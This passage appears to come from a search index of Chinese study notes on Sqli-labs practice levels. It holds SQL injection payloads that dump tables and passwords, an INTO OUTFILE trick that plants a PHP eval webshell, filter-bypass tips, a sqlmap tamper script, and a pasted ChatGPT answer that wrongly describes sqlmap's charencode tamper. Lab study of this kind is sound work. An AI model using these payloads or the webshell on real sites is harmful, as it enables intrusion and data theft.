file_get_contents($filename);\n    echo $str;\n}\n</code></pre> 3. \u5b83\u548c\u524d\u9762\u7684\u903b\u8f91\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u7684\u662f\u5b83\u8fd9\u91cc\u4f7f\u7528file_get_contents\u51fd\u6570\u8fdb\u884c\u6587\u4ef6\u7684\u8bfb\u53d6\u6267\u884c\uff0c\u800cfile_get_contents\u51fd\u6570\u53ef\u4ee5\u5bf9\u672c\u5730\u6587\u4ef6\u8fdb\u884c\u8bfb\u53d6\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u8fdc\u7a0b\u6587\u4ef6\u8fdb\u884c\u8bfb\u53d6\u3002</p>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/","title":"Sqli labs\u7b14\u8bb0","text":""},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_1","title":"\u7b14\u8bb0","text":""},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_2","title":"\u7b2c\u4e03\u5173","text":"Text Only<pre><code>?id=1'))UNION SELECT 1,2,3 into outfile \"D:\\\\uuu.txt\"--+\n</code></pre> <p>\u521a\u5f00\u59cb\u8fd9\u513f\u4e00\u76f4\u4e0d\u884c\uff0c\u786c\u76d8\u4e0a\u51fa\u73b0\u4e0d\u4e86uuu.txt\uff0c\u539f\u56e0\u662f\u81ea\u5df1\u7684mysql\u8bbe\u7f6e\u95ee\u9898\u3002</p> <p>\u5728MySQL\u4e2d\uff0coutfile\u53ef\u4ee5\u7528\u6765\u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u60f3\u8981\u6267\u884c\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u5c31\u5fc5\u987b\u8981\u5f00\u542f\u6587\u4ef6\u5199\u5165\u7684\u6743\u9650\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u6267\u884c\uff1a<code>show variables like '%secure%';</code>\u6765\u67e5\u770b\uff1a\u53d1\u73b0<code>secure_file_priv</code>\u7684 value \u503c\u662f NULL\uff0c\u90a3\u4e48\u8fd9\u4ee3\u8868\u6b64\u65f6\u6587\u4ef6\u5199\u5165\u7684\u6743\u9650\u662f\u5173\u95ed\u7684\uff0c\u90a3\u6211\u4eec\u9700\u8981\u5199\u5165\u8f93\u51fa\u6587\u4ef6\u7684\u4fdd\u5b58\u8def\u5f84\u6765\u5f00\u542f\u5b83\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u6765\u5230MySQL\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u4f1a\u770b\u5230\u4e00\u4e2amy.ini\u7684\u6587\u4ef6\u3002</p> <p>\u6253\u5f00my.ini\u6587\u4ef6\uff0c\u6dfb\u52a0<code>secure_file_priv</code>\u4ee5\u53ca\u4ed6\u6240\u5bf9\u5e94\u7684\u53c2\u6570\uff1a\uff08\u6211\u5199\u7684\u662f<code>secure_file_priv='D://'</code>\uff09</p> <p>\u6ce8\u610f\uff1a\u8def\u5f84\u7684\u659c\u6760\u9700\u8981\u91c7\u7528//\u9700\u8981\u591a\u52a0\u4e00\u4e2a\u659c\u6760\u6765\u8f6c\u4e49\u5b57\u7b26\uff0c\u5176\u6b21\uff0c\u56e0\u4e3aC\u76d8\u7684\u6743\u9650\u95ee\u9898\uff0c\u8bf7\u4e0d\u8981\u628a\u8def\u5f84\u5199\u5230C\u76d8\u4e0a\u3002\u3010\u5f00\u59cb\u6211\u6ca1\u6709\u6ce8\u610f\u8fd9\u4e00\u70b9\u5bfc\u81f4sql\u8bed\u53e5\u4e00\u76f4\u62a5\u9519\uff0c\u5f88\u5934\u75bc\u3011</p> <p>\u4e4b\u540e\u6211\u4eec\u91cd\u542fMySQL\u670d\u52a1\uff1a</p> <p>\u6700\u540e\u91cd\u590d\u521a\u624d\u7684sql\u8bed\u53e5<code>show variables like '%secure%';</code> \u6765\u67e5\u770b\u662f\u5426\u4fee\u6539\u6210\u529f\uff1a\u53d1\u73b0\u5df2\u7ecf\u51fa\u73b0\u8def\u5f84\u4e86\u3002</p> <p>\u90a3\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c<code>outfile</code>\u6765\u8f93\u51fa\u6587\u4ef6\u5230 D\u76d8\u7684\u4efb\u610f\u4f4d\u7f6e\u4e86\u3002</p> Text Only<pre><code>my.ini\u6587\u4ef6\u662fMySQL\u6570\u636e\u5e93\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7a0b\u5e8f\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u53ef\u4ee5\u7528\u4e8e\u8bbe\u7f6eMySQL\u7684\u57fa\u672c\u8fd0\u884c\u53c2\u6570\u3001\u5b89\u5168\u6027\u3001\u7f13\u5b58\u3001\u65e5\u5fd7\u8bb0\u5f55\u7b49\u65b9\u9762\u7684\u53c2\u6570\u3002\n</code></pre> <p>\u5728sql\u6f0f\u6d1e\u4e2d\u53ef\u4ee5\u4f7f\u7528file\u7cfb\u5217\u51fd\u6570</p> <p>load_file()  \uff1a\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6 into outfile \uff1a\u5c06\u67e5\u8be2\u7684\u6570\u636e\u5199\u5165\u6587\u4ef6\u4e2d into dumpfile\uff1a\u5c06\u67e5\u8be2\u7684\u6570\u636e\u5199\u5165\u6587\u4ef6\u4e2d(\u53ea\u80fd\u5199\u5165\u4e00\u884c\u6570\u636e)</p> Text Only<pre><code>secure_file_prive=null //\u9650\u5236mysqld \u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa\nsecure_file_priv=/path/  //\u9650\u5236mysqld\u7684\u5bfc\u5165\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728\u9ed8\u8ba4\u7684/path/\u76ee\u5f55\u4e0b\nsecure_file_priv=\u2019\u2019  //\u4e0d\u5bf9mysqld \u7684\u5bfc\u5165 \u5bfc\u51fa\u505a\u9650\u5236\n</code></pre> <p>outfile\u51fd\u6570\u53ef\u4ee5\u5bfc\u51fa\u591a\u884c\uff0c\u800cdumpfile\u53ea\u80fd\u5bfc\u51fa\u4e00\u884c\u6570\u636e outfile\u51fd\u6570\u5728\u5c06\u6570\u636e\u5199\u5230\u6587\u4ef6\u91cc\u65f6\u6709\u7279\u6b8a\u7684\u683c\u5f0f\u8f6c\u6362\uff0c\u800cdumpfile\u5219\u4fdd\u6301\u539f\u6570\u636e\u683c\u5f0f</p> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>?id=-1')) union select version(),database(),user() into outfile \"D:\\\\uuu.txt\" --+</code>\u6765\u4f7f\u5f97\u6240\u9700\u4fe1\u606f\u8f93\u51fa\u5230uuu.txt</p> <p>\u4e5f\u53ef\u4ee5\u5f04\u4e00\u4e9b\u6269\u5c55\u7684\u4e1c\u897f\uff08\u901a\u8fc7\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\u5b9e\u73b0\u8fdc\u7a0b\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff09</p> Text Only<pre><code>?id=1'))union select 1,2,'&lt;?php @eval($_POST['a']);?&gt;' into outfile \"D:\\\\ProgramData\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\uuu.php\"--+\n\n\u8681\u5251\u8bbf\u95ee\uff1ahttp://127.0.0.1/uuu.php\n</code></pre> Text Only<pre><code>&lt;?php @eval($_POST['a']);?&gt;\n</code></pre>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_3","title":"\u7b2c\u4e8c\u5341\u4e09\u5173","text":"<p>\u7b2c\u4e8c\u5341\u4e09\u5173\u91cd\u65b0\u56de\u5230get\u8bf7\u6c42\uff0c\u4f1a\u53d1\u73b0\u8f93\u5165\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u4f46\u662f\u6ce8\u91ca\u7b26\u4e0d\u7ba1\u7528\u3002\u731c\u6d4b\u6ce8\u91ca\u7b26\u88ab\u8fc7\u6ee4\uff0c\u770b\u6765\u6e90\u7801\u679c\u7136\u88ab\u6ce8\u91ca\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u53d1\u73b0\u6210\u529f\u3002\u4e4b\u540e\u53ef\u4ee5\u4f7f\u7528\u8054\u5408\u6ce8\u5165\u3002\u4e0d\u8fc7\u5728\u5224\u65ad\u5217\u6570\u65f6\u5019\u4e0d\u80fd\u4f7f\u7528order by \u53bb\u5224\u65ad\u9700\u8981\u7528?id=-1' union select 1,2,3,4 or '1'='1\u901a\u8fc7\u4e0d\u505c\u52a0\u6570\u5b57\u5224\u65ad\u6700\u540e\u6839\u636e\u9875\u9762\u663e\u793a\u662f\u4e09\u5217\uff0c\u4e14\u663e\u793a\u4f4d\u662f2\u53f7\u3002</p> Text Only<pre><code>?id=1' or '1'='1\n\n\u8fd9\u6837sql\u8bed\u53e5\u5c31\u53d8\u6210 id='1' or '1'='1'\n\n\n?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1\n\n?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1\n\n?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1\n</code></pre>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_4","title":"\u7b2c\u4e8c\u5341\u4e94\u5173","text":"<p>\u672c\u5173\u4e3b\u8981\u4e3a or and \u8fc7\u6ee4\uff0c\u5982\u4f55\u7ed5\u8fc7 or \u548c and \u8fc7\u6ee4\u3002</p> <p>\u6839\u636e\u63d0\u793a\u662f\u5c06or\u548cand\u8fd9\u4e24\u4e2a\u66ff\u6362\u6210\u7a7a\uff0c\u4f46\u662f\u53ea\u66ff\u6362\u4e00\u6b21\u3002\u5927\u5c0f\u5199\u7ed5\u8fc7\u6ca1\u6709\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u53cc\u5199\u7ed5\u8fc7\u3002\u672c\u6b21\u5173\u5361\u4f7f\u7528\u8054\u5408\u6ce8\u5165\u5c31\u53ef\u4ee5\u4e86\uff0cinformation\u91cc\u9762\u6d89\u53caor\u53ef\u4ee5\u5199\u6210infoorrmation\u3002</p> <p>\u4e00\u822c\u6027\u63d0\u4f9b\u4ee5\u4e0b\u51e0\u79cd\u601d\u8def\uff1a </p> <p>\uff081\uff09\u5927\u5c0f\u5199\u53d8\u5f62 Or,OR,oR </p> <p>\uff082\uff09\u7f16\u7801\uff0chex\uff0curlencode </p> <p>\uff083\uff09\u6dfb\u52a0\u6ce8\u91ca/or/ </p> <p>\uff084\uff09\u5229\u7528\u7b26\u53f7 and=&amp;&amp; or=||</p>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_5","title":"\u7b2c\u4e8c\u5341\u4e94\u5173","text":"<p>Q\uff1asqlmap\u4e2d\u5c06<code>and</code>\u66ff\u6362\u4e3a<code>&amp;&amp;</code>\uff0c\u9700\u8981\u4f7f\u7528\u54ea\u4e00\u4e2a--tamper \u7ed5\u8fc7WAF\u811a\u672c</p> <p>A\uff1a\u5728SQLMap\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528<code>--tamper</code>\u9009\u9879\u6765\u4f7f\u7528\u7279\u5b9a\u7684\u7ed5\u8fc7WAF\u811a\u672c\u3002\u5982\u679c\u4f60\u60f3\u5c06<code>AND</code>\u66ff\u6362\u4e3a<code>&amp;&amp;</code>\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u7684<code>tamper</code>\u811a\u672c<code>charencode</code>\u3002</p> <p>\u8fd9\u5c06\u4f7f\u7528<code>charencode</code>\u811a\u672c\u6765\u7f16\u7801\u8bf7\u6c42\u4e2d\u7684\u5b57\u7b26\uff0c\u5305\u62ec\u5c06<code>AND</code>\u66ff\u6362\u4e3a<code>&amp;&amp;</code>\u3002</p> <p>Q\uff1a\u6211\u4e0d\u9700\u8981\u7f16\u7801\u8bf7\u6c42\u4e2d\u7684\u5b57\u7b26\uff0c\u53ea\u9700\u8981\u5305\u62ec\u5c06AND\u66ff\u6362\u4e3a&amp;&amp;</p> <p>A\uff1a\u5982\u679c\u4f60\u53ea\u60f3\u7b80\u5355\u5730\u5c06<code>AND</code>\u66ff\u6362\u4e3a<code>&amp;&amp;</code>\uff0c\u800c\u4e0d\u8fdb\u884c\u5176\u4ed6\u5b57\u7b26\u7f16\u7801\u6216\u8f6c\u6362\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u7ed5\u8fc7\u811a\u672c\u3002\u4ee5\u4e0b\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u7ed5\u8fc7\u811a\u672c\u793a\u4f8b\uff0c\u5b83\u5c06\u66ff\u6362\u67e5\u8be2\u4e2d\u7684<code>AND</code>\u4e3a<code>&amp;&amp;</code>\uff1a</p> Python<pre><code>def tamper(payload, **kwargs):\n    payload = payload.replace(\"AND\", \"&amp;&amp;\")\n    payload = payload.replace(\"OR\", \"||\")\n    return payload\n</code></pre> <p>\u5c06\u4e0a\u8ff0\u4ee3\u7801\u4fdd\u5b58\u4e3a<code>and_to_double_amp.py</code>\uff08\u6216\u4efb\u4f55\u4f60\u559c\u6b22\u7684\u540d\u79f0\uff09\uff0c\u7136\u540e\u5728SQLMap\u4e2d\u4f7f\u7528<code>--tamper</code>\u9009\u9879\u6307\u5b9a\u8be5\u811a\u672c\u7684\u8def\u5f84\uff1a</p> Text Only<pre><code>sqlmap -u &lt;\u76ee\u6807URL&gt; --tamper and_to_double_amp.py\n</code></pre> <p>\u8fd9\u5c06\u5e94\u7528\u81ea\u5b9a\u4e49\u7684\u7ed5\u8fc7\u811a\u672c\uff0c\u5c06<code>AND</code>\u66ff\u6362\u4e3a<code>&amp;&amp;</code>\u3002</p>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_6","title":"\u7b2c\u4e8c\u5341\u516d\u5173","text":"<p>\u6ce8\u91ca\u7b26\u4ee5\u53ca\u7a7a\u683c\u7ed9\u8fc7\u6ee4\u4e86</p> <p>\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5355\u5f15\u53f7\u8fdb\u884c\u95ed\u5408\uff0c\u53cc\u5199\u7ed5\u8fc7\u903b\u8f91\u8fd0\u7b97\u7b26\u6216\u8005\u4f7f\u7528<code>&amp;&amp;</code>\u548c<code>||</code>\u66ff\u6362\u3002\u7a7a\u683c\u7ed5\u8fc7\u7f51\u4e0a\u627e\u4e86\u4e9b\u8d44\u6599\uff0c\u5bf9\u4e8e\u7ed5\u8fc7\u7a7a\u683c\u9650\u5236\u6709\u5927\u628a\u7684\u65b9\u5f0f\u5bf9\u4e8e\u7a7a\u683c\uff0c\u6709\u8f83\u591a\u7684\u65b9\u6cd5\uff1a</p> Text Only<pre><code>%09 TAB\u952e\uff08\u6c34\u5e73\uff09\n%0a \u65b0\u5efa\u4e00\u884c\n%0c \u65b0\u7684\u4e00\u9875\n%0d return\u529f\u80fd\n%0b TAB\u952e\uff08\u5782\u76f4\uff09\n%a0 \u7a7a\u683c\n</code></pre> <p>\u6211\u5728windows\u548ckali\u91cc\u9762\u90fd\u7528\u4e0d\u4e86\uff0c\u53ef\u80fd\u662f\u56e0\u4e3aapache\u89e3\u6790\u4e0d\u4e86\u3002\u53ea\u80fd\u4f7f\u7528()\u7ed5\u8fc7\u3002\u62a5\u9519\u6ce8\u5165\u7a7a\u683c\u4f7f\u7528\u6bd4\u8f83\u5c11\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u62a5\u9519\u6ce8\u5165\u3002</p>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_7","title":"\u7591\u95ee","text":""},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_8","title":"\u7b2c\u4e94\u5173\u7684\u7591\u95ee\uff1a","text":"<p>\u7b2c\u4e94\u5173\u662f\u5e03\u5c14\u76f2\u6ce8\uff0c\u4f46\u662f\u5e03\u5c14\u76f2\u6ce8\u7684payload\u80af\u5b9a\u7b26\u5408\u8bed\u6cd5\uff0c\u53ea\u662f\u8bf4\u901a\u8fc7\u8bed\u6cd5\u5185\u5bb9\u7684\u6b63\u786e\u4e0e\u5426\u6765\uff08\u662f\u5426\u56de\u663e\u56fa\u5b9a\u5185\u5bb9\uff09\uff0c\u6765\u83b7\u53d6\u4fe1\u606f\u3002\u4f46\u662f\u6709\u65f6\u5019\u5982\u679c\u4f7f\u7528\u9519\u8bef\u8bed\u6cd5\u7684payload\uff0c\u4e5f\u6709\u56de\u663e\u3002</p> Text Only<pre><code>?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+\n# \u663e\u793a\u6570\u636e\u5e93\u540d\n</code></pre> Text Only<pre><code>?id=1' union select 1,count(*),updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.schemata),0x3a),1)a from information_schema.columns group by a--+\n# \u62a5\u9519\uff1aOnly constant XPATH queries are supported\uff08\u4ec5\u652f\u6301\u5e38\u91cf XPATH \u67e5\u8be2\uff09\n</code></pre>"},{"location":"WEB/labs/Sqli-labs%E7%AC%94%E8%AE%B0/#_9","title":"\u7b2c\u5341\u4e03\u5173\u7684\u7591\u95ee\uff1a","text":"<p>\u8fd9\u4e00\u5173\u7528\u7684\u4f7f\u589e\u5220\u6539\u90e8\u5206\uff0c\u5efa\u8bae\u770b\u770b SQL \u6ce8\u5165\u5929\u4e66 \u548c\u540e\u7aef\u4ee3\u7801</p> <p>\u6e90\u7801\uff1a</p> PHP<pre><code>&lt;?php\nfunction check_input($value) // \u68c0\u67e5\u8f93\u5165\u7684\u8d26\u6237\u540d\n{\n    if (!empty($value)) // \u5982\u679c\u8d26\u6237\u540d\u4e0d\u4e3a\u7a7a\u5219\u8fdb\u884c\u4ee5\u4e0b\u5224\u65ad\n    {\n        // truncation (see comments)\n        $value = substr($value, 0, 15); // \u622a\u53d6\u8d26\u6237\u540d\u524d15\u7684\u5b57\u7b26\n    }\n\n    // Stripslashes if magic quotes enabled\n    if (get_magic_quotes_gpc()) // \u8be5\u51fd\u6570\u662f\u90fd\u662fon\u4e5f\u5c31\u662f\u6253\u5f00\uff0c\u6253\u5f00\u5219\u8fdb\u5165\u4e00\u4e0b\u5224\u65ad\n    // \u8be5\u51fd\u6570\u7684\u4f5c\u7528\u662f\u7ed9\uff08' \" / null\uff09\u7279\u6b8a\u5b57\u7b26\u52a0\u4e0a\u53cd\u659c\u6760\u8f6c\u4e49\n    //\u9ed8\u8ba4\u5730\uff0cPHP \u5bf9\u6240\u6709\u7684 GET\u3001POST \u548c COOKIE \u6570\u636e\u81ea\u52a8\u8fd0\u884c addslashes()\uff0c\uff08PS:\u4e5f\u662f\u8fd9\u4f5c\u7528\uff09\n    {\n        $value = stripslashes($value); // \u5220\u9664\u53cd\u659c\u6760\n    }\n\n    // Quote if not a number\n    if (!ctype_digit($value)) // uname\u5b57\u7b26\u4e32\u5982\u679c\u662f\u975e\u6570\u5b57\uff0c\u5219\u5c06\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u8f6c\u4e49\n    {\n        $value = \"'\" . mysql_real_escape_string($value) . \"'\"; // \u51fd\u6570\u8f6c\u4e49 SQL \u8bed\u53e5\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3002\n    } else //\u5982\u679c\u662f\u6570\u5b57\n    {\n        $value = intval($value); // \u53d8\u6210\u6574\u6570\n    }\n    return $value;\n}\n?&gt;\n</code></pre> <p>==\u7b2c\u4e00\u4e2a\u7591\u95ee\uff1a==</p> Text Only<pre><code>1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c)))#\n</code></pre> <p>\u6ce8\u610f\u4e0a\u9762\u4ee3\u7801\u91cc\u7684\u201cb\u201d\uff0c\u5982\u679c\u5220\u9664\u5219\u4f1a\u53d1\u751f\u9519\u8bef\uff08Every derived table must have its own alias\uff09\uff08\u6bcf\u4e2a\u6d3e\u751f\u8868\u90fd\u5fc5\u987b\u6709\u81ea\u5df1\u7684\u522b\u540d\uff09\u4e0d\u61c2\u8fd9\u662f\u4e3a\u4ec0\u4e48\u3002</p> <p>==\u89e3\u7b54\uff1a\uff08CharGPT\uff09==</p> <p>Q\uff1a\u4e3a\u4ec0\u4e48\u9519\u8bef</p> <p>A\uff1a\u5728\u4f60\u7684 SQL \u6ce8\u5165\u8bed\u53e5\u4e2d\uff0c\u4f7f\u7528\u5b50\u67e5\u8be2\u65f6\uff0c\u6bcf\u4e2a\u6d3e\u751f\u8868\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u522b\u540d\u3002\u5728\u4f60\u7684\u7b2c\u4e8c\u4e2a\u8bed\u53e5\u4e2d\uff0c\u4f60\u53bb\u6389\u4e86<code>b</code>\uff0c\u4f46\u662f\u7531\u4e8e\u7f3a\u5c11\u522b\u540d\uff0c\u5bfc\u81f4\u4e86\u9519\u8bef\u3002</p> <p>Q\uff1a\u8bf7\u8be6\u7ec6\u89e3\u91ca\u4e3a\u4ec0\u4e48\u4f7f\u7528\u5b50\u67e5\u8be2\u65f6\uff0c\u6bcf\u4e2a\u6d3e\u751f\u8868\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u522b\u540d\u3002</p> <p>A\uff1a\u5728 SQL \u67e5\u8be2\u4e2d\uff0c\u6d3e\u751f\u8868\u662f\u5728\u67e5\u8be2\u7684 FROM \u5b50\u53e5\u4e2d\u4f7f\u7528\u7684\u5b50\u67e5\u8be2\u3002\u5f53\u4f60\u5728 SQL \u67e5\u8be2\u4e2d\u4f7f\u7528\u5b50\u67e5\u8be2\u65f6\uff0c\u6d3e\u751f\u8868\uff08\u5373\u5b50\u67e5\u8be2\uff09\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u4e34\u65f6\u7684\u8868\uff0c\u5b83\u4f1a\u5728\u67e5\u8be2\u6267\u884c\u65f6\u751f\u6210\uff0c\u5e76\u88ab\u5f15\u7528\u4e8e\u4e3b\u67e5\u8be2\u4e2d\u3002</p> <p>\u7ed9\u6d3e\u751f\u8868\u4e00\u4e2a\u522b\u540d\u7684\u539f\u56e0\u6709\u51e0\u4e2a\uff1a</p> <ol> <li> <p>\u5f15\u7528\u5b57\u6bb5\u540d\uff1a \u5982\u679c\u4f60\u7684\u5b50\u67e5\u8be2\u4e2d\u5305\u542b\u4e86\u4e00\u4e9b\u8ba1\u7b97\u3001\u9009\u62e9\u6216\u5176\u4ed6\u64cd\u4f5c\uff0c\u5e76\u4e14\u4f60\u60f3\u5728\u4e3b\u67e5\u8be2\u4e2d\u5f15\u7528\u8fd9\u4e9b\u64cd\u4f5c\u7684\u7ed3\u679c\uff0c\u4f60\u9700\u8981\u4e3a\u5b50\u67e5\u8be2\u521b\u5efa\u4e00\u4e2a\u522b\u540d\uff0c\u4ee5\u4fbf\u5728\u4e3b\u67e5\u8be2\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5b57\u6bb5\u3002\u5426\u5219\uff0c\u6570\u636e\u5e93\u5f15\u64ce\u53ef\u80fd\u65e0\u6cd5\u8bc6\u522b\u5b57\u6bb5\u662f\u4ece\u54ea\u4e2a\u8868\uff08\u6216\u6d3e\u751f\u8868\uff09\u4e2d\u5f97\u5230\u7684\u3002</p> SQL<pre><code>SELECT subquery_alias.field_name\nFROM (SELECT some_operation AS field_name FROM your_table) AS subquery_alias;\n</code></pre> </li> <li> <p>\u652f\u6301\u591a\u4e2a\u6d3e\u751f\u8868\uff1a \u5982\u679c\u4f60\u7684\u67e5\u8be2\u4e2d\u6d89\u53ca\u591a\u4e2a\u6d3e\u751f\u8868\uff0c\u4e3a\u6bcf\u4e2a\u6d3e\u751f\u8868\u6dfb\u52a0\u522b\u540d\u6709\u52a9\u4e8e\u533a\u5206\u5b83\u4eec\u3002\u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u8868\u5fc5\u987b\u6709\u552f\u4e00\u7684\u540d\u79f0\uff0c\u5373\u4f7f\u662f\u4e34\u65f6\u751f\u6210\u7684\u6d3e\u751f\u8868\u4e5f\u4e0d\u4f8b\u5916\u3002\u8fd9\u6709\u52a9\u4e8e\u6570\u636e\u5e93\u5f15\u64ce\u6b63\u786e\u89e3\u91ca\u67e5\u8be2\u4e2d\u6bcf\u4e2a\u8868\u7684\u5f15\u7528\u3002</p> SQL<pre><code>SELECT *\nFROM (SELECT column1 FROM table1) AS table1_alias\nJOIN (SELECT column2 FROM table2) AS table2_alias ON table1_alias.column1 = table2_alias.column2;\n</code></pre> </li> <li> <p>\u6e05\u6670\u53ef\u8bfb\u6027\uff1a \u4f7f\u7528\u522b\u540d\u53ef\u4ee5\u4f7f SQL \u67e5\u8be2\u66f4\u6613\u8bfb\u3002\u5b83\u63d0\u4f9b\u4e86\u5bf9\u8868\u6216\u6d3e\u751f\u8868\u7684\u66f4\u5177\u63cf\u8ff0\u6027\u7684\u540d\u79f0\uff0c\u4f7f\u67e5\u8be2\u66f4\u6613\u4e8e\u7406\u89e3\u548c\u7ef4\u62a4\u3002</p> </li> </ol> <p>\u603b\u7684\u6765\u8bf4\uff0c\u7ed9\u6bcf\u4e2a\u6d3e\u751f\u8868\u6dfb\u52a0\u522b\u540d\u662f\u4e00\u79cd\u826f\u597d\u7684 SQL \u7f16\u7801\u5b9e\u8df5\uff0c\u6709\u52a9\u4e8e\u63d0\u9ad8\u67e5\u8be2\u7684\u53ef\u8bfb\u6027\u3001\u7ef4\u62a4\u6027\uff0c\u5e76\u786e\u4fdd\u67e5\u8be2\u6267\u884c\u65f6\u5f15\u7528\u7684\u8868\u662f\u660e\u786e\u7684\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u8981\u6c42\u4e3a\u6bcf\u4e2a\u6d3e\u751f\u8868\u63d0\u4f9b\u522b\u540d\uff0c\u4ee5\u6ee1\u8db3\u8bed\u6cd5\u89c4\u8303\u3002</p> <p>Q\uff1a\u90a3\u4e3a\u4ec0\u4e48 ?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+\u4e0d\u9700\u8981\u8bbe\u7f6e\u522b\u540d</p> <p>A\uff1a\u5728\u4f60\u63d0\u4f9b\u7684 SQL \u6ce8\u5165\u8bed\u53e5\u4e2d\uff0c\u662f\u5229\u7528\u4e86 UNION \u64cd\u4f5c\u7b26\uff0c\u800c\u4e0d\u662f\u5b50\u67e5\u8be2\u3002\u5728 UNION \u64cd\u4f5c\u7b26\u4e2d\uff0c\u4e0d\u9700\u8981\u4e3a\u6bcf\u4e2a SELECT \u5b50\u53e5\u8bbe\u7f6e\u522b\u540d\u7684\u4e3b\u8981\u539f\u56e0\u662f\uff0cUNION \u7684\u76ee\u6807\u662f\u5408\u5e76\u591a\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u96c6\uff0c\u800c\u4e0d\u662f\u521b\u5efa\u6d3e\u751f\u8868\u3002\u5728 UNION \u4e2d\uff0c\u7ed3\u679c\u96c6\u7684\u5217\u540d\u662f\u7531\u7b2c\u4e00\u4e2a SELECT \u8bed\u53e5\u5b9a\u4e49\u7684\uff0c\u540e\u7eed\u7684 SELECT \u8bed\u53e5\u7684\u5217\u540d\u5fc5\u987b\u4e0e\u7b2c\u4e00\u4e2a SELECT \u8bed\u53e5\u7684\u5217\u540d\u76f8\u5339\u914d\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0c\u4f60\u7684\u6ce8\u5165\u8bed\u53e5\u662f\u8fd9\u6837\u7684\uff1a</p> SQL<pre><code>?id=-1') UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--+\n</code></pre> <p>\u5728\u8fd9\u91cc\uff0cUNION \u5408\u5e76\u4e86\u4e24\u4e2a\u67e5\u8be2\uff1a</p> <ol> <li><code>SELECT 1,2</code>: \u4ea7\u751f\u4e00\u4e2a\u4e24\u5217\u7684\u7ed3\u679c\u96c6\uff0c\u5217\u503c\u5206\u522b\u4e3a1\u548c2\u3002</li> <li><code>SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'</code>: \u4ea7\u751f\u4e00\u4e2a\u5305\u542b users \u8868\u5217\u540d\u8fde\u63a5\u7ed3\u679c\u7684\u7ed3\u679c\u96c6\u3002</li> </ol> <p>\u8fd9\u4e24\u4e2a SELECT \u8bed\u53e5\u7684\u5217\u6570\u548c\u6570\u636e\u7c7b\u578b\u5fc5\u987b\u5339\u914d\uff0c\u800c\u4e0d\u9700\u8981\u4e3a\u5b83\u4eec\u8bbe\u7f6e\u522b\u540d\u3002\u6570\u636e\u5e93\u7cfb\u7edf\u4f1a\u4f7f\u7528\u7b2c\u4e00\u4e2a SELECT \u8bed\u53e5\u7684\u5217\u540d\u4f5c\u4e3a\u6574\u4e2a UNION \u7ed3\u679c\u7684\u5217\u540d\u3002</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cUNION 